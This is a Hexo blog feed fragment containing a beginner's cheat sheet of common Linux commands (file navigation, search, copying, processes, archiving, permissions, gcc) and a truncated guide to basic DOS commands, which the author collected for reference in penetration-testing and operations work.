      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础SQL语句</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80SQL%E8%AF%AD%E5%8F%A5/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础SQL语句/</id>
    <published>2019-09-05T03:15:52.000Z</published>
    <updated>2019-09-05T03:15:52.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基础Linux命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80Linux%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础Linux命令/</id>
    <published>2019-09-05T03:15:40.000Z</published>
    <updated>2019-09-18T01:32:08.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。</p><a id="more"></a><h1 id="0x01-基础命令"><a href="#0x01-基础命令" class="headerlink" title="0x01 基础命令"></a>0x01 基础命令</h1><h2 id="1-1-cd命令"><a href="#1-1-cd命令" class="headerlink" title="1.1 cd命令"></a>1.1 cd命令</h2><p>这是一个非常基本，也是大家经常需要使用的命令，它用于切换当前目录，它的参数是要切换到的目录的路径，可以是绝对路径，也可以是相对路径。如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/Docements <span class="comment"># 切换到目录/root/Docements  </span></span><br><span class="line"><span class="built_in">cd</span> ./path          <span class="comment"># 切换到当前目录下的path目录中，“.”表示当前目录   </span></span><br><span class="line"><span class="built_in">cd</span> ../path         <span class="comment"># 切换到上层目录中的path目录中，“..”表示上一层目录</span></span><br></pre></td></tr></table></figure><h2 id="1-2-ls命令"><a href="#1-2-ls命令" class="headerlink" title="1.2 ls命令"></a>1.2 ls命令</h2><p>这是一个非常有用的查看文件与目录的命令，list之意，它的参数非常多，下面就列出一些我常用的参数吧，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-l ：列出长数据串，包含文件的属性与权限数据等  </span><br><span class="line">-a ：列出全部的文件，连同隐藏文件（开头为.的文件）一起列出来（常用） </span><br><span class="line">-d ：仅列出目录本身，而不是列出目录的文件数据  </span><br><span class="line">-h ：将文件容量以较易读的方式（GB，kB等）列出来  </span><br><span class="line">-R ：连同子目录的内容一起列出（递归列出），等于该目录下的所有文件都会显示出来</span><br></pre></td></tr></table></figure><p>注：这些参数也可以组合使用，下面举两个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l  #以长数据串的形式列出当前目录下的数据文件和目录  </span><br><span class="line">ls -lR #以长数据串的形式列出当前目录下的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-3-grep命令"><a href="#1-3-grep命令" class="headerlink" title="1.3 grep命令"></a>1.3 grep命令</h2><p>该命令常用于分析一行的信息，若当中有我们所需要的信息，就将该行显示出来，该命令通常与管道命令一起使用，用于对一些命令的输出进行筛选加工等等.</p><p>简单语法:</p><blockquote><p>grep [-acinv] [–color=auto] ‘查找字符串’ filename</p></blockquote><p>它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a ：将binary文件以text文件的方式查找数据</span><br><span class="line">-c ：计算找到‘查找字符串’的次数</span><br><span class="line">-i ：忽略大小写的区别，即把大小写视为相同</span><br><span class="line">-v ：反向选择，即显示出没有‘查找字符串’内容的那一行</span><br><span class="line"># 例如：</span><br><span class="line"># 取出文件/etc/man.config中包含MANPATH的行，并把找到的关键字加上颜色</span><br><span class="line">grep --color=auto &apos;MANPATH&apos; /etc/man.config</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 把ls -l的输出中包含字母file（不区分大小写）的内容输出</span><br><span class="line">ls -l | grep -i file</span><br></pre></td></tr></table></figure><h2 id="1-4-find命令"><a href="#1-4-find命令" class="headerlink" title="1.4 find命令"></a>1.4 find命令</h2><p>find是一个基于查找的功能非常强大的命令，相对而言，它的使用也相对较为复杂，参数也比较多，所以在这里将给把它们分类列出，它的基本语法如下：</p><blockquote><p>语法：find [PATH] [option] [action]  </p></blockquote><ol><li>与时间有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-mtime n : n为数字，意思为在n天之前的“一天内”被更改过的文件；  </span><br><span class="line">-mtime +n : 列出在n天之前（不含n天本身）被更改过的文件名；  </span><br><span class="line">-mtime -n : 列出在n天之内（含n天本身）被更改过的文件名；  </span><br><span class="line">-newer file : 列出比file还要新的文件名</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /root -mtime 0 # 在当前目录下查找今天之内有改动的文件</span><br></pre></td></tr></table></figure><ol start="2"><li>与用户或用户组名有关的参数：  </li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-user name : 列出文件所有者为name的文件  </span><br><span class="line">-group name : 列出文件所属用户组为name的文件  </span><br><span class="line">-uid n : 列出文件所有者为用户ID为n的文件  </span><br><span class="line">-gid n : 列出文件所属用户组为用户组ID为n的文件</span><br></pre></td></tr></table></figure><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /home/ljianhui -user ljianhui # 在目录/home/ljianhui中找出所有者为ljianhui的文件</span><br></pre></td></tr></table></figure><ol start="3"><li>与文件权限及名称有关的参数：   </li></ol><p>​        例如：  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name passwd # 查找文件名为passwd的文件  </span><br><span class="line"></span><br><span class="line">find . -perm 0755 # 查找当前目录中文件权限的0755的文件  </span><br><span class="line"></span><br><span class="line">find . -size +12k # 查找当前目录中大于12KB的文件，注意c表示byte</span><br></pre></td></tr></table></figure><blockquote><p>语法：find [PATH] [option] [action]</p></blockquote><h2 id="1-5-cp命令"><a href="#1-5-cp命令" class="headerlink" title="1.5 cp命令"></a>1.5 cp命令</h2><p>该命令用于复制文件，copy之意，它还可以把多个文件一次性地复制到一个目录下，它的常用参数如下：</p><blockquote><p>语法：[plain] <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">view plain</a> <a href="http://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">copy</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-a ：将文件的特性一起复制  </span><br><span class="line"></span><br><span class="line">-p ：连同文件的属性一起复制，而非使用默认方式，与-a相似，常用于备份 </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在时，在覆盖时会先询问操作的进行  </span><br><span class="line"></span><br><span class="line">-r ：递归持续复制，用于目录的复制行为  </span><br><span class="line"></span><br><span class="line">-u ：目标文件与源文件有差异时才会复制</span><br></pre></td></tr></table></figure><p>​      例如 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2  </span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中  </span><br><span class="line"></span><br><span class="line">cp -a file1 file2 #连同文件的所有特性把文件file1复制成文件file2</span><br><span class="line"></span><br><span class="line">cp file1 file2 file3 dir #把文件file1、file2、file3复制到目录dir中</span><br></pre></td></tr></table></figure><h2 id="1-6-mv命令"><a href="#1-6-mv命令" class="headerlink" title="1.6 mv命令"></a>1.6 mv命令</h2><p>该命令用于移动文件、目录或更名，move之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：force强制的意思，如果目标文件已经存在，不会询问而直接覆盖  </span><br><span class="line"></span><br><span class="line">-i ：若目标文件已经存在，就会询问是否覆盖  </span><br><span class="line"></span><br><span class="line">-u ：若目标文件已经存在，且比目标文件新，才会更新</span><br></pre></td></tr></table></figure><blockquote><p>PS：该命令可以把一个文件或多个文件一次移动一个文件夹中，但是最后一个目标文件一定要是“目录”。</p></blockquote><h2 id="1-7-rm命令"><a href="#1-7-rm命令" class="headerlink" title="1.7 rm命令"></a>1.7 rm命令</h2><p>该命令用于删除文件或目录，remove之间，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-f ：就是force的意思，忽略不存在的文件，不会出现警告消息  </span><br><span class="line"></span><br><span class="line">-i ：互动模式，在删除前会询问用户是否操作  </span><br><span class="line"></span><br><span class="line">-r ：递归删除，最常用于目录删除，它是一个非常危险的参数</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -i file # 删除文件file，在删除之前会询问是否进行该操作  </span><br><span class="line"></span><br><span class="line">rm -fr dir # 强制删除目录dir中的所有文件</span><br></pre></td></tr></table></figure><h2 id="1-8-ps命令"><a href="#1-8-ps命令" class="headerlink" title="1.8 ps命令"></a>1.8 ps命令</h2><p>该命令用于将某个时间点的进程运行情况选取下来并输出，process之意，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A ：所有的进程均显示出来  </span><br><span class="line"></span><br><span class="line">-a ：不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">-u ：有效用户的相关进程  </span><br><span class="line"></span><br><span class="line">-x ：一般与a参数一起使用，可列出较完整的信息  </span><br><span class="line"></span><br><span class="line">-l ：较长，较详细地将PID的信息列出</span><br></pre></td></tr></table></figure><p>其实我们只要记住ps一般使用的命令参数搭配即可，它们并不多，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ps aux # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps ax # 查看不与terminal有关的所有进程  </span><br><span class="line"></span><br><span class="line">ps -lA # 查看系统所有的进程数据  </span><br><span class="line"></span><br><span class="line">ps axjf # 查看连同一部分进程树状态</span><br></pre></td></tr></table></figure><h2 id="1-9-kill命令"><a href="#1-9-kill命令" class="headerlink" title="1.9 kill命令"></a>1.9 kill命令</h2><p>该命令用于向某个工作（%jobnumber）或者是某个PID（数字）传送一个信号，它通常与ps和jobs命令一起使用，它的基本语法如下：</p><blockquote><p>语法：kill -signal PID</p></blockquote><p>signal的常用参数如下：</p><p>注：最前面的数字为信号的代号，使用时可以用代号代替相应的信号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1：SIGHUP，启动被终止的进程  </span><br><span class="line"></span><br><span class="line">2：SIGINT，相当于输入ctrl+c，中断一个程序的进行  </span><br><span class="line"></span><br><span class="line">9：SIGKILL，强制中断一个进程的进行  </span><br><span class="line"></span><br><span class="line">15：SIGTERM，以正常的结束进程方式来终止进程  </span><br><span class="line"></span><br><span class="line">17：SIGSTOP，相当于输入ctrl+z，暂停一个进程的进行</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 以正常的结束进程方式来结束第一个后台工作，可用jobs命令查看后台中的第一个工作进程  </span><br><span class="line"></span><br><span class="line">kill -SIGTERM %1   </span><br><span class="line"></span><br><span class="line"># 重新改动进程ID为PID的进程，PID可用ps命令通过管道命令加上grep命令进筛选获得  </span><br><span class="line"></span><br><span class="line">kill -SIGHUP PID</span><br></pre></td></tr></table></figure><h2 id="1-10-killall命令"><a href="#1-10-killall命令" class="headerlink" title="1.10 killall命令"></a>1.10 killall命令</h2><p>该命令用于向一个命令启动的进程发送一个信号</p><blockquote><p>语法：killall [-iIe] [command name]</p></blockquote><p>参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-i ：交互式的意思，若需要删除时，会询问用户</span><br><span class="line">-e ：表示后面接的command name要一致，但command name不能超过15个字符</span><br><span class="line">-I ：命令名称忽略大小写</span><br><span class="line"># 例如：</span><br><span class="line">killall -SIGHUP syslogd # 重新启动syslogd</span><br></pre></td></tr></table></figure><h2 id="1-11-file命令"><a href="#1-11-file命令" class="headerlink" title="1.11 file命令"></a>1.11 file命令</h2><p>该命令用于判断接在file命令后的文件的基本数据，因为在Linux下文件的类型并不是以后缀为分的，所以这个命令对我们来说就很有用了，它的用法非常简单，基本语法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file filename</span><br><span class="line">#例如：</span><br><span class="line">file ./test</span><br></pre></td></tr></table></figure><p>##1.12 tar命令</p><p>该命令用于对文件进行打包，默认情况并不会压缩，如果指定了相应的参数，它还会调用相应的压缩程序（如gzip和bzip等）进行压缩和解压。它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-c ：新建打包文件</span><br><span class="line">-t ：查看打包文件的内容含有哪些文件名</span><br><span class="line">-x ：解打包或解压缩的功能，可以搭配-C（大写）指定解压的目录，注意-c,-t,-x不能同时出现在同一条命令中</span><br><span class="line">-j ：通过bzip2的支持进行压缩/解压缩</span><br><span class="line">-z ：通过gzip的支持进行压缩/解压缩</span><br><span class="line">-v ：在压缩/解压缩过程中，将正在处理的文件名显示出来</span><br><span class="line">-f filename ：filename为要处理的文件</span><br><span class="line">-C dir ：指定压缩/解压缩的目录dir</span><br></pre></td></tr></table></figure><p>虽然命令的参数很多，但是常用的只有3条</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">压缩：tar -jcv -f filename.tar.bz2 要被处理的文件或目录名称</span><br><span class="line">查询：tar -jtv -f filename.tar.bz2</span><br><span class="line">解压：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录</span><br></pre></td></tr></table></figure><blockquote><p>ps：文件名并不定要以后缀tar.bz2结尾，这里主要是为了说明使用的压缩程序为bzip2</p></blockquote><h2 id="1-13-cat命令"><a href="#1-13-cat命令" class="headerlink" title="1.13 cat命令"></a>1.13 cat命令</h2><p>该命令用于查看文本文件的内容，后接要查看的文件名，通常可用管道与more和less一起使用，从而可以一页页地查看数据。例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat text | less # 查看text文件中的内容</span><br><span class="line"># 注：这条命令也可以使用less text来代替</span><br></pre></td></tr></table></figure><h2 id="1-14-chgrp命令"><a href="#1-14-chgrp命令" class="headerlink" title="1.14 chgrp命令"></a>1.14 chgrp命令</h2><p>该命令用于改变文件所属用户组，它的使用非常简单，它的基本用法如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chgrp [-R] dirname/filename</span><br><span class="line">-R ：进行递归的持续对所有文件和子目录更改</span><br><span class="line"># 例如：</span><br><span class="line">chgrp users -R ./dir # 递归地把dir目录下中的所有文件和子目录下所有文件的用户组修改为users</span><br></pre></td></tr></table></figure><h2 id="1-15-chown命令"><a href="#1-15-chown命令" class="headerlink" title="1.15 chown命令"></a>1.15 chown命令</h2><p>该命令用于改变文件的所有者，与chgrp命令的使用方法相同，只是修改的文件属性不同，不再详述。</p><h2 id="1-16-chmod命令"><a href="#1-16-chmod命令" class="headerlink" title="1.16 chmod命令"></a>1.16 chmod命令</h2><p>该命令用于改变文件的权限，一般的用法如下：</p><blockquote><p>语法：chmod [-R] xyz 文件或目录</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-R：进行递归的持续更改，即连同子目录下的所有文件都会更改</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 0755 file # 把file的文件权限改变为-rxwr-xr-x</span><br><span class="line">chmod g+w file # 向file的文件权限中加入用户组可写权限</span><br></pre></td></tr></table></figure><h2 id="1-17"><a href="#1-17" class="headerlink" title="1.17"></a>1.17</h2><h2 id="1-18-vim命令"><a href="#1-18-vim命令" class="headerlink" title="1.18 vim命令"></a>1.18 vim命令</h2><p>该命令主要用于文本编辑，它接一个或多个文件名作为参数，如果文件存在就打开，如果文件不存在就以该文件名创建一个文件。vim是一个非常好用的文本编辑器，它里面有很多非常好用的命令，在这里不再多说。你可以从这里下载<a href="http://download.csdn.net/detail/ljianhui/6215287" target="_blank" rel="noopener">vim常用操作</a>的详细说明。</p><h2 id="1-19-gcc命令"><a href="#1-19-gcc命令" class="headerlink" title="1.19 gcc命令"></a>1.19 gcc命令</h2><p>对于一个用Linux开发C程序的人来说，这个命令就非常重要了，它用于把C语言的源程序文件，编译成可执行程序，由于g++的很多参数跟它非常相似，所以这里只介绍gcc的参数，它的常用参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">-o ：output之意，用于指定生成一个可执行文件的文件名</span><br><span class="line">-c ：用于把源文件生成目标文件（.o)，并阻止编译器创建一个完整的程序</span><br><span class="line">-I ：增加编译时搜索头文件的路径</span><br><span class="line">-L ：增加编译时搜索静态连接库的路径</span><br><span class="line">-S ：把源文件生成汇编代码文件</span><br><span class="line">-lm：表示标准库的目录中名为libm.a的函数库</span><br><span class="line">-lpthread ：连接NPTL实现的线程库</span><br><span class="line">-std= ：用于指定把使用的C语言的版本</span><br><span class="line"> </span><br><span class="line"># 例如：</span><br><span class="line"># 把源文件test.c按照c99标准编译成可执行程序test</span><br><span class="line">gcc -o test test.c -lm -std=c99</span><br><span class="line">#把源文件test.c转换为相应的汇编程序源文件test.s</span><br><span class="line">gcc -S test.c</span><br></pre></td></tr></table></figure><h2 id="1-20-time命令"><a href="#1-20-time命令" class="headerlink" title="1.20 time命令"></a>1.20 time命令</h2><p>该命令用于测算一个命令（即程序）的执行时间。它的使用非常简单，就像平时输入命令一样，不过在命令的前面加入一个time即可，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">time ./process</span><br><span class="line">time ps aux</span><br></pre></td></tr></table></figure><p>在程序或命令运行结束后，在最后输出了三个时间，它们分别是：<br>user：用户CPU时间，命令执行完成花费的用户CPU时间，即命令在用户态中执行时间总和；<br>system：系统CPU时间，命令执行完成花费的系统CPU时间，即命令在核心态中执行时间总和；<br>real：实际时间，从command命令行开始执行到运行终止的消逝时间；</p><p>注：用户CPU时间和系统CPU时间之和为CPU时间，即命令占用CPU执行的时间总和。实际时间要大于CPU时间，因为Linux是多任务操作系统，往往在执行一条命令时，系统还要处理其它任务。另一个需要注意的问题是即使每次执行相同命令，但所花费的时间也是不一样，其花费时间是与系统运行相关的。</p><h1 id="0x02-转载链接"><a href="#0x02-转载链接" class="headerlink" title="0x02 转载链接"></a>0x02 转载链接</h1><p><a href="https://blog.csdn.net/ljianhui/article/details/11100625/" target="_blank" rel="noopener">https://blog.csdn.net/ljianhui/article/details/11100625/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Linux在渗透测试和安全运维的工作中都会经常使用，但是命令太多，作为一个普通的人类是不可能全部都记住的。所以在这里整理一个Linux命令的文档来方便自己日后查看。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>基础DOS命令</title>
    <link href="https://www.mad-coding.cn/2019/09/05/%E5%9F%BA%E7%A1%80DOS%E5%91%BD%E4%BB%A4/"/>
    <id>https://www.mad-coding.cn/2019/09/05/基础DOS命令/</id>
    <published>2019-09-05T03:15:17.000Z</published>
    <updated>2019-09-05T03:40:17.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在进行渗透测试的过程中，不免会用到DOS系统下的一些命令，所以这篇文章将常用的DOS命令进行整理归纳，方便他人学习和自己查看。</p><a id="more"></a><h1 id="0x01-常用命令归纳"><a href="#0x01-常用命令归纳" class="headerlink" title="0x01 常用命令归纳"></a>0x01 常用命令归纳</h1><h2 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h2><p>dir是英文单词directory(目录）的缩写，主要用来显示一个目录下的文件和子目录。 </p><blockquote><p>[功能] 显示指定磁盘、目录中的文件和子目录信息，包括文件及子目录所在磁盘的卷标、文件与子目录的名称、每个文件的大小、文件及目录建立的日期时间，以及文件子目录的个数、所占用总字节数以及磁盘上的剩余总空间等信息。 </p></blockquote><blockquote><p>[格式] dir [C:][path][filename][.ext][/o][/s][/p][/w][/a] </p></blockquote><blockquote><p>[说明] dir是DOS命令中最常用的一个。斜杠表示后面的内容是参数。DOS参数最常用的是以下四个：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">参 数 意 义 :</span><br><span class="line">/p </span><br><span class="line">显示信息满一屏时，暂停显示，按任意键后显示下一屏 </span><br><span class="line"></span><br><span class="line">/o </span><br><span class="line">排序显示。o后面可以接不同意义的字母 </span><br><span class="line"></span><br><span class="line">/w </span><br><span class="line">只显示文件名目录名，每行五个文件名。即宽行显示 </span><br><span class="line"></span><br><span class="line">/s </span><br><span class="line">将目录及子目录的全部目录文件都显示 </span><br><span class="line">/a </span><br><span class="line">显示隐藏文件</span><br></pre></td></tr></table></figure><blockquote><p>[举例] 显示C:\WINDOWS\Desktop文件夹里面的信息 </p></blockquote><h2 id="1-2-md"><a href="#1-2-md" class="headerlink" title="1.2 md"></a>1.2 md</h2><p>md是英文make directory（创建目录）的缩写 </p><blockquote><p>[功能] 创建一个子目录 </p></blockquote><blockquote><p>[格式] md [C:]path </p></blockquote><blockquote><p>[举例] 用md 建立一个叫做purple的目录 </p></blockquote><h2 id="1-3-cd"><a href="#1-3-cd" class="headerlink" title="1.3 cd"></a>1.3 cd</h2><p>cd是英文change directory(改变目录）的缩写 </p><blockquote><p>[功能] 改变或显示当前目录 </p></blockquote><blockquote><p>[格式] cd [C:][path] </p></blockquote><blockquote><p>[说明] 路径可以使用绝对路径和相对路径两种。如果只有cd而没有参数，则只显示当前路径。注意：子目录中一定有两个“特殊目录”，即“.”“..”，其中一点表示当前目录，两点表示上一层目录。从简单实用的角度来看，我们只要学会逐层进入（cd 下一层某目录名），和逐层退出（cd..）就可以解决所有问题。当然也可以用绝对路径的办法。 </p></blockquote><blockquote><p>[举例] 进入我们刚才建立的purple目录 </p></blockquote><h2 id="1-4-rd"><a href="#1-4-rd" class="headerlink" title="1.4 rd"></a>1.4 rd</h2><p>remove directory–删除目录 </p><blockquote><p>[功能] 删除空子目录 </p></blockquote><blockquote><p>[格式] rd [d:]path </p></blockquote><blockquote><p>[说明] rd是专门删除空子目录的命令。注意两条：一是不能删除非空目录；二是不能删除当前目录。 </p></blockquote><blockquote><p>[举例] 用rd删除purple这个目录 </p></blockquote><p>下面我们来运用md, cd, rd这三个命令。 </p><h2 id="1-5-copy"><a href="#1-5-copy" class="headerlink" title="1.5 copy"></a>1.5 copy</h2><p>copy在英文中是复制的意思 </p><blockquote><p>[功能] 复制一个或一组文件到指定的磁盘或目录中 </p></blockquote><blockquote><p>[格式] copy [C:][path][filename.ext] [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 复制文件命令基本用法是：“复制 源文件名 目标文件名”。如果只写目标路径而不写目标文件名，表示同名复制；否则称为换名复制。注意换名复制一般不要更改文件扩展名。 </p></blockquote><blockquote><p>[举例] 将C:\purple目录的所有文件复制到软盘，可以打如下命令，请注意当前盘与当前路径不同： </p></blockquote><p>C:&gt;copy purple A:\ </p><p>如果目标盘上已有同名文件，会出现如下提示，“Overwrite xxxx(Yes/No/All)”此时回答Y则覆盖当前文件，N则保留，A则覆盖此后的所有文件而不再提问。 </p><h2 id="1-6-del"><a href="#1-6-del" class="headerlink" title="1.6 del"></a>1.6 del</h2><p>del是英文delete（删除）的缩写 </p><blockquote><p>[功能] 删除指定磁盘、目录中的一个或一组文件 </p></blockquote><blockquote><p>[格式] del [C:][path]filename.ext </p></blockquote><blockquote><p>[说明] 这个命令应小心使用。一旦被删除，将不易恢复。同样可以采用通配符为删除一类文件。当利用<em>.</em>时，为了安全将给出警告，确定方进行删除工作。删除过程如没有信息提示，表示已正确删除。 </p></blockquote><p>注意这个命令不能删除具有只读、隐含、系统属性的文件；如果指定文件不存在，则出现“File not found”的提示；DOS对误删除的文件可以用UNDELETE外部命令恢复；它<strong>只能删文件，不能删目录</strong>。 </p><h2 id="1-7-ren"><a href="#1-7-ren" class="headerlink" title="1.7 ren"></a>1.7 ren</h2><p>ren是英文rename（重新命名）的简写 </p><blockquote><p>[功能] 对指定磁盘、目录中的一个文件或一组文件更改名称 </p></blockquote><blockquote><p>[格式] ren 